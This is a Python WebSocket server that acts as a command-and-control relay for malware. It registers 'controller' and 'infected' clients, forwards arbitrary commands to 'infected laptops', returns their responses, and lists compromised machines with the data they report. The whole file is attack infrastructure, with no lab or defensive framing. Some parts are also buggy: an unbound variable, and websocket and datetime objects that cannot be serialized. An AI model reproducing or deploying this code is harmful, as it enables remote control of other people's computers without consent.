import asyncio
import websockets
import json
import uuid
import logging
import socket
from datetime import datetime, timedelta

# Configure logging
logging.basicConfig(level=logging.DEBUG, format="%(asctime)s [%(levelname)s] %(message)s")

# Store connected computers and messages
clients = {}
messages = []

# Message retention time (1 day)
MESSAGE_RETENTION_PERIOD = timedelta(days=1)

# Utility function to clean up old messages
def cleanup_old_messages():
    global messages
    cutoff = datetime.now() - MESSAGE_RETENTION_PERIOD
    messages[:] = [msg for msg in messages if msg['command_time'] > cutoff]
    logging.info(f"Cleaned up messages. Remaining messages: {len(messages)}")

# Assign a unique ID to each new connection
async def register_client(websocket, role, client_id, data=None):
    clients[client_id] = {
        'websocket': websocket,
        'last_seen': datetime.now(),
        'role': role,
        'data': data,
        'messages': []
    }
    logging.info(f"Registered new {role}: {client_id} with data: {data}")

# Relay messages between control and infected laptops
async def relay_messages(websocket, client_id, role):
    while True:
        try:
            message = await websocket.recv()
            data = json.loads(message)
            logging.info(f"Received message from {client_id} ({role}): {data}")

            cleanup_old_messages()  # Clean up old messages before processing new ones

            if data.get("type") == "command" and role == "controller":
                target_id = data['target']
                command = data['command']
                command_type = data['command_type']

                logging.info(f"Processing command for target {target_id}: {command}")

                if target_id in clients and clients[target_id]['role'] == 'infected':
                    target_ws = clients[target_id]['websocket']
                    command_id = str(uuid.uuid4())
                    command_time = datetime.now()

                    new_message = {
                        'id': command_id,
                        'origin': client_id,
                        'target': target_id,
                        'command_time': command_time,
                        'response_time': None,
                        'type': command_type,
                        'command': command,
                        'response': None
                    }

                    await target_ws.send(json.dumps(new_message))
                    messages.append(new_message)
                    logging.info(f"Command sent to target {target_id}: {new_message}")
                else:
                    clients[client_id]['messages'].append(data)
                    logging.info(f"Client {target_id} is not connected. Command queued.")

            elif data.get("type") == "response" and role == "infected":
                command_id = data['command_id']
                response = data['response']
                logging.info(f"Processing response for command ID {command_id}: {response}")

                # Find the original command and update it with the response
                for msg in messages:
                    if msg['id'] == command_id:
                        msg['response'] = response
                        msg['response_time'] = datetime.now()
                        logging.info(f"Updated message with response: {msg}")
                        break

                origin_id = msg['origin']
                if origin_id in clients:
                    origin_ws = clients[origin_id]['websocket']
                    await origin_ws.send(json.dumps(msg))
                    logging.info(f"Response relayed to origin {origin_id}: {msg}")

            elif data.get("type") == "request_client_list" and role == "controller":
                clients_list = {client_id: {
                    'websocket': client['websocket'],
                    'last_seen': client['last_seen'],
                    'role': client['role'],
                    'data': client.get('data', {})
                } for client_id, client in clients.items()}

                await websocket.send(json.dumps({'type': 'infected_list', 'infected_laptops': clients_list}))


        except websockets.ConnectionClosed:
            logging.info(f"Client {client_id} ({role}) disconnected.")
            del clients[client_id]
            break
        except Exception as e:
            logging.error(f"Exception occurred: {e}", exc_info=True)

# Handle new connections
async def connection_handler(websocket, path):
    client_id = None
    try:
        initial_message = await websocket.recv()
        initial_data = json.loads(initial_message)

        role = initial_data['role']
        client_id = initial_data['id']

        data = initial_data.get('data') if role == 'infected' else None

        await register_client(websocket, role, client_id, data)
        await relay_messages(websocket, client_id, role)
    except websockets.ConnectionClosed:
        logging.info(f"Connection closed for client: {client_id if client_id else 'unknown client'}")
        if client_id in clients:
            del clients[client_id]
    except Exception as e:
        logging.error(f"Exception occurred in connection handler: {e}", exc_info=True)

# Function to get the local IP address of the server
def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = "127.0.0.1"
    finally:
        s.close()
    return ip

# Start the WebSocket server
async def main():
    ip_address = get_local_ip()
    port = 6857

    logging.info(f"Server listening on 0.0.0.0:{port}")
    logging.info(f"Server at {ip_address}:{port}")

    async with websockets.serve(connection_handler, "0.0.0.0", port):
        await asyncio.Future()  # Run forever

if __name__ == "__main__":
    asyncio.run(main())
